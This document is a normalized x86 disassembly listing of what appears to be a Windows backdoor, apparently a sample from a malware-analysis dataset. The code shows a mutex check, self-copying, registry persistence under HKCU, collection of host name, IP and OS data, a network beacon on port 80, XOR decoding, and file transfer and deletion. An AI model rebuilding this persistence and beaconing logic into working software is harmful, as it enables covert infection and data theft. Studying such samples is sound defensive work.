sub_401000
mov eax sub_403be0
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_4010d2
test eax eax
jne r-xdata
call sub_401c69
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_401047
push 0x8
push rw-data
call sub_40200c
push 0x22
push rw-data
call sub_40200c
push 0x2d
push rw-data
call sub_40200c
push 0x10
push rw-data
call sub_40200c
push 0xa
push rw-data
call sub_40200c
push 0xc
push rw-data
call sub_40200c
push 0x15
push rw-data
call sub_40200c
push 0x5
push rw-data
call sub_40200c
add esp 0x40
push 0x7
push rw-data
call sub_40200c
push 0xb
push rw-data
call sub_40200c
push 0x12
push rw-data
call sub_40200c
add esp 0x18
retn
sub_4010d2
push ebp
mov ebp esp
sub esp 0x310
push ebx
push esi
push edi
call sub_401047
mov esi rw-data
xor ebx ebx
push esi
push ebx
push 0x1f0001
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push esi
push ebx
push ebx
call [ CreateMutexA@IAT ]
push ebx
lea eax [ ebp - 0x108 ]
push 0x2
push eax
push ebx
call [ SHGetSpecialFolderPathA@IAT ]
lea eax [ ebp - 0x20c ]
push rw-data
push eax
call strcpy
pop ecx
lea edi [ ebp - 0x20c ]
pop ecx
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x108 ]
push edi
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x108 ]
push ebx
push eax
call [ CreateDirectoryA@IAT ]
cmp esi ebx
je r-xdata
mov [ esi ] bl
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x310 ]
pop ecx
push 0x104
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x108 ]
push ebx
push eax
lea eax [ ebp - 0x310 ]
push eax
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x108 ]
push eax
call sub_4012c1
mov edi rw-data
mov esi rw-data
push edi
push esi
call strcpy
push rw-data
push esi
call strcat
mov esi rw-data
push edi
push esi
call strcpy
push rw-data
push esi
call strcat
add esp 0x24
call sub_4012a2
test eax eax
je r-xdata
lea edi [ esi + 0x1 ]
jmp r-xdata
push rw-data
call sub_4013a2
call sub_4013e0
neg eax
sbb eax eax
push ebx
neg eax
mov [ rw-data ] eax
call sub_401319
pop ecx
pop ecx
call sub_402ef4
test eax eax
je r-xdata
push 0x5c
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
call sub_402029
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push sub_40253b
push ebx
push ebx
call [ CreateThread@IAT ]
mov esi [ malloc@IAT ]
mov edi 0x2000
push edi
call esi
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_4035a8
test eax eax
je r-xdata
push edi
call esi
pop ecx
mov [ rw-data ] eax
xor ecx ecx
cmp eax ebx
setne cl
mov eax ecx
push rw-data
push rw-data
push 0x80000001
call [ SHDeleteValueA@IAT ]
sub_4012c1
push ebp
mov ebp esp
push ecx
push esi
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
push [ ebp + 0x8 ]
call strlen
pop ecx
push eax
push [ ebp + 0x8 ]
push 0x1
push esi
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_401319
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
mov edi rw-data
push eax
push edi
push ebx
mov esi rw-data
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push ebx
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x4
push edi
push 0x4
push ebx
push esi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_4013a2
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi 0x9c
push edi
push 0x0
push esi
call memset
add esp 0xc
mov [ esi ] edi
mov edi [ GetVersionExA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
call [ GetSystemDefaultLangID@IAT ]
pop edi
mov [ rw-data ] ax
pop esi
retn
push esi
mov [ esi ] 0x94
call edi
sub_4013e0
push ebp
mov ebp esp
sub esp 0x108
push ebx
push esi
lea eax [ ebp - 0x4 ]
push edi
push eax
xor ebx ebx
push 0x1
push ebx
push rw-data
push 0x80000001
mov [ ebp - 0x8 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x8 ]
mov esi [ RegQueryValueExA@IAT ]
push eax
push rw-data
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call esi
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x108 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x100
call esi
push [ ebp - 0x4 ]
mov esi eax
call [ RegCloseKey@IAT ]
cmp edi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ strstr@IAT ]
mov edi eax
pop ecx
cmp edi ebx
pop ecx
je r-xdata
lea edi [ ebp - 0x108 ]
add edi 0x5
jmp r-xdata
push eax
push rw-data
call strcpy
inc esi
push esi
call [ atoi@IAT ]
add esp 0xc
mov [ rw-data ] eax
push 0x1
pop eax
jmp r-xdata
push 0x3a
push edi
call [ strchr@IAT ]
mov esi eax
push edi
mov [ esi ] bl
call sub_40209c
add esp 0xc
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_4014d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x0
push 0x1
pop esi
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov edi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ edi ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call [ Ordinal_WSOCK32_12@IAT ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
push 0x10
and [ ebx + 0x4 ] 0x0
mov [ ebx ] 0x3c
and [ esi ] 0x0
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0xc ]
inc [ esi ]
push eax
mov [ eax ] 0x2
push [ edi ]
call [ Ordinal_WSOCK32_4@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push ebx
push 0x0
push esi
inc eax
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
pop eax
push [ edi ]
call [ Ordinal_WSOCK32_3@IAT ]
sub_401569
push ebp
mov ebp esp
mov eax 0x2140
call sub_403a10
push ebx
push esi
push edi
xor ebx ebx
push [ ebp + 0x8 ]
call sub_40209c
mov esi [ Ordinal_WSOCK32_9@IAT ]
mov edi [ Ordinal_WSOCK32_10@IAT ]
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3c ]
push eax
call strcpy
pop ecx
pop ecx
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x1a ] ax
lea eax [ ebp - 0x3c ]
push eax
call edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_4014d0
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
call esi
push rw-data
mov [ ebp - 0x1a ] ax
call edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_4014d0
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push 0x1
pop ebx
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x24 ]
push 0x1
push [ ebp + 0x18 ]
push 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x2140 ]
push edi
push eax
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_19@IAT ]
push 0x1
pop esi
cmp [ ebp + 0x24 ] esi
jne r-xdata
test ebx ebx
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2140 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_401d43
add esp 0x1c
lea eax [ ebp - 0x2140 ]
push eax
call strlen
push [ ebp + 0x18 ]
mov edi eax
mov esi edi
push [ ebp + 0x14 ]
lea eax [ ebp + edi - 0x2140 ]
push eax
call memcpy
add edi [ ebp + 0x18 ]
add esp 0x10
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push [ ebp - 0x4 ]
call sub_401e55
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push 0x0
push eax
mov eax [ ebp - 0x4 ]
push 0x0
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
lea ebx [ edi - 0xc ]
mov eax 0x1ff9
cmp ebx eax
jbe r-xdata
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov edi 0x3e800
cmp eax edi
jge r-xdata
xor esi esi
jmp r-xdata
add esi 0x5
cmp esi ebx
jge r-xdata
mov ebx eax
xor ebx ebx
xor esi esi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
jmp r-xdata
lea eax [ ebp + esi - 0x2140 ]
mov [ ebp + 0x18 ] eax
mov eax edi
push ebx
sub eax esi
push eax
mov eax [ ebp + 0x1c ]
add eax esi
push eax
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jge r-xdata
inc esi
inc [ ebp + 0x18 ]
cmp esi ebx
jl r-xdata
cmp eax ebx
je r-xdata
mov [ ebp + esi - 0x213b ] 0x2a
push 0x7
push rw-data
push [ ebp + 0x18 ]
call memcmp
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] esi
pop eax
jmp r-xdata
add esi eax
cmp esi edi
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
lea eax [ ebp - 0x140 ]
push ebx
push eax
mov eax [ ebp - 0x4 ]
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_40178e
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ esp + 0x8 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401569
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov eax [ esi ]
push 0x1
mov [ rw-data ] eax
pop edi
movzx eax [ esi + 0x4 ]
mov [ rw-data ] eax
movzx eax [ esi + 0x6 ]
mov [ rw-data ] eax
pop edi
pop esi
pop ecx
retn
sub_4017f8
push ebp
mov ebp esp
sub esp 0x58c
push 0x3e800
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jne r-xdata
push ebx
push esi
mov esi rw-data
push edi
lea eax [ ebp - 0x587 ]
push esi
push eax
call strcpy
push esi
call strlen
mov ebx eax
mov esi rw-data
add ebx 0x6
push esi
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
push esi
call strlen
lea ebx [ ebx + eax + 0x1 ]
mov esi 0x9c
push esi
push rw-data
lea eax [ ebp + ebx - 0x58c ]
push eax
call memcpy
mov ax [ rw-data ]
add ebx esi
mov edx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x18c ]
add esp 0x24
movsd [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] ax
inc ebx
movsd [ edi ] [ esi ]
inc ebx
push 0x1d
test edx edx
setne al
movsw [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] al
mov eax [ rw-data ]
inc ebx
pop ecx
movsb [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] eax
xor eax eax
lea edi [ ebp - 0x181 ]
mov esi [ sprintf@IAT ]
[ edi ]
stosb [ edi ]
xor eax eax
add ebx 0x4
cmp edx eax
je r-xdata
leave
retn
lea eax [ ebp - 0x18c ]
push eax
push rw-data
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x1c
lea ebx [ ebx + eax + 0x1 ]
call [ GetTickCount@IAT ]
mov ecx 0x36ee80
xor edx edx
mov edi ecx
mov [ ebp - 0x4 ] eax
div edi
mov edi 0xea60
mov eax edx
xor edx edx
div edi
xor edx edx
push eax
mov eax [ ebp - 0x4 ]
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push 0x2f
push eax
call [ strrchr@IAT ]
mov ebx rw-data
lea edi [ ebp + esi - 0x58c ]
push ebx
push edi
mov [ ebp - 0x4 ] eax
call strcpy
mov eax [ ebp - 0x4 ]
add esp 0x34
test eax eax
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push 0x1
push eax
lea eax [ ebp - 0x58c ]
push [ ebp - 0x8 ]
mov [ ebp - 0x58c ] 0x30
mov [ ebp - 0x58b ] esi
push esi
push eax
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_401569
push [ ebp - 0x8 ]
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push edi
call strcat
push ebx
call strlen
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x1 ]
cmp [ rw-data ] eax
mov al 0x43
jne r-xdata
cmp [ rw-data ] eax
je r-xdata
push [ rw-data ]
movsx eax al
push rw-data
push eax
lea eax [ ebp - 0x18c ]
push rw-data
push eax
call esi
add esp 0x14
mov al 0x20
mov al 0x50
jmp r-xdata
sub_401a64
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_401569
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
push [ ebp - 0x4 ]
push esi
call sub_401ac1
pop ecx
mov edi eax
pop ecx
pop edi
pop esi
leave
retn
sub_401ac1
push ebx
xor ebx ebx
cmp [ esp + 0xc ] ebx
push esi
push edi
jle r-xdata
xor eax eax
mov edi [ esp + 0x10 ]
mov esi rw-data
push esi
call strlen
pop ecx
add eax ebx
mov eax [ eax + edi + 0x1 ]
xor ecx ecx
cmp eax [ rw-data ]
sete cl
mov eax ecx
jmp r-xdata
inc ebx
cmp ebx [ esp + 0x14 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + edi ]
push esi
push eax
call strcmp
pop ecx
test eax eax
pop ecx
je r-xdata
sub_401b0e
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
lea esi [ edi + edi * 4 + 0x3a98 ]
shl esi 0x1
call [ GetTickCount@IAT ]
test edi edi
mov [ rw-data ] eax
jle r-xdata
push 0x1
pop eax
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax edi
push 0x0
sub eax ebx
push eax
mov eax [ esp + 0x18 ]
add eax ebx
push eax
push [ rw-data ]
call [ Ordinal_WSOCK32_19@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
retn
add ebx eax
mov eax edi
sub eax ebx
add eax 0xbb8
lea esi [ eax + eax * 4 ]
shl esi 0x1
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
and [ rw-data ] 0x0
push 0x1
call [ Sleep@IAT ]
mov eax esi
dec esi
test eax eax
je r-xdata
jmp r-xdata
cmp ebx edi
jl r-xdata
sub_401b9b
push ebp
mov ebp esp
sub esp 0x200
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi ] 0x41
je r-xdata
push 0x200
lea eax [ ebp - 0x200 ]
push esi
push eax
call memset
add esp 0xc
push esi
push [ edi + 0x1 ]
push 0x1
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_401d43
lea eax [ ebp - 0x200 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_401b0e
add esp 0x28
test eax eax
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
push [ ebp + 0xc ]
push edi
call sub_401b0e
pop ecx
pop ecx
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
pop edi
pop esi
leave
retn
push [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] esi
call [ Ordinal_WSOCK32_3@IAT ]
call sub_4020bb
test eax eax
je r-xdata
push 0x1
call [ Sleep@IAT ]
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
sub_401c69
push ecx
push ecx
push ebx
push ebp
push esi
mov esi [ Sleep@IAT ]
push edi
push 0x1
xor ebx ebx
mov ebp 0x2710
pop edi
push 0x32
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call esi
call sub_40178e
test eax eax
jne r-xdata
push eax
call [ Ordinal_WSOCK32_3@IAT ]
call sub_4017f8
test eax eax
je r-xdata
push 0x249f0
jmp r-xdata
push ebp
call sub_401a64
test eax eax
je r-xdata
call esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
cmp eax ebx
mov [ rw-data ] ebx
je r-xdata
call sub_401f60
mov [ rw-data ] eax
call sub_4020bb
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] edi
push eax
push 0x8004667e
push [ rw-data ]
call [ Ordinal_WSOCK32_12@IAT ]
lea eax [ esp + 0x14 ]
mov [ rw-data ] edi
push eax
push ebx
push ebx
push sub_4025be
push ebx
push ebx
mov [ rw-data ] bl
call [ CreateThread@IAT ]
mov [ rw-data ] edi
cmp [ rw-data ] ebx
je r-xdata
call sub_402432
push edi
call esi
jmp r-xdata
cmp [ rw-data ] ebx
je r-xdata
sub_401d43
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
cmp [ ebp + 0x20 ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push rw-data
jmp r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
push esi
call strcat
pop ecx
pop ecx
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x18
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
sub_401e55
push ebp
mov ebp esp
mov eax 0x2008
call sub_403a10
push ebx
push esi
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call [ strstr@IAT ]
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
je r-xdata
sub_401f07
push ebp
mov ebp esp
sub esp 0x80
push [ ebp + 0xc ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x80 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_401b0e
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
push [ rw-data ]
call sub_401e55
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp eax 0x3e800
jge r-xdata
push 0x1
pop eax
leave
retn
sub_401f60
push ebp
mov ebp esp
sub esp 0x11c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
leave
retn
mov ax [ rw-data ]
push eax
call [ Ordinal_WSOCK32_9@IAT ]
push rw-data
mov [ ebp - 0xe ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_4014d0
add esp 0x10
test eax eax
jne r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_401f07
pop ecx
mov esi eax
pop ecx
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
pop esi
leave
retn
sub_401fe3
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
test edx edx
mov [ eax ] edx
jle r-xdata
retn
mov ecx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push esi
sub eax ecx
mov esi edx
mov dl [ eax + ecx ]
xor dl 0x23
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
pop esi
sub_402029
push ebp
mov ebp esp
sub esp 0x104
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xff
push eax
push rw-data
call [ GetComputerNameA@IAT ]
mov eax [ ebp - 0x4 ]
push 0xff
and [ eax + rw-data ] 0x0
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
push rw-data
lea eax [ ebp - 0x104 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
jmp r-xdata
push rw-data
call strcpy
pop ecx
pop ecx
leave
retn
sub_4020bb
push ebp
mov ebp esp
sub esp 0x120
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
mov esi [ Ordinal_WSOCK32_9@IAT ]
push edi
mov [ rw-data ] ebx
mov edi rw-data
jne r-xdata
mov ax [ rw-data ]
push eax
call esi
push rw-data
mov [ ebp - 0xe ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_4014d0
add esp 0x10
test eax eax
je r-xdata
mov ax [ rw-data ]
push eax
call esi
mov [ ebp - 0xe ] ax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_4014d0
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x1
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
push ebx
push sub_402640
push ebx
push ebx
call [ CreateThread@IAT ]
cmp eax ebx
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
call sub_402849
test eax eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x1
pop eax
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_401f07
pop ecx
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
sub_4021f2
push ebp
mov ebp esp
mov eax 0x2008
call sub_403a10
mov eax [ rw-data ]
push ebx
push esi
push edi
push 0x1
cmp eax 0x53
pop ebx
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x2008 ] 0x53
cmp eax 0x59
sete al
dec eax
and al 0xec
add eax 0x59
mov [ ebp - 0x2008 ] al
jmp r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push 0x5
pop ecx
sub ecx [ ebp + 0x8 ]
push esi
add eax ecx
mov [ ebp - 0x2007 ] eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x2008 ]
push 0x5
push eax
call sub_401b9b
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp - 0x2008 ] 0x59
jne r-xdata
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call [ fopen@IAT ]
push edi
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push eax
call [ fseek@IAT ]
add esp 0x14
cmp [ rw-data ] edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x55
call sub_402c9e
jmp r-xdata
push 0x6
pop eax
mov [ ebp - 0x2007 ] eax
push eax
lea eax [ ebp - 0x2008 ]
push eax
call sub_401b9b
pop ecx
mov eax ebx
pop ecx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov esi 0x2000
pop edi
pop esi
pop ebx
leave
retn
cmp ebx esi
jne r-xdata
cmp [ rw-data ] 0x41
jne r-xdata
cmp [ rw-data ] edi
je r-xdata
push [ ebp - 0x8 ]
call [ fclose@IAT ]
mov eax [ ebp - 0x4 ]
pop ecx
push [ ebp - 0x8 ]
call [ fclose@IAT ]
pop ecx
push edi
push [ ebp + 0xc ]
call [ SetFileAttributesA@IAT ]
push [ ebp + 0xc ]
call [ DeleteFileA@IAT ]
push 0x1
pop eax
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2008 ]
push esi
push 0x1
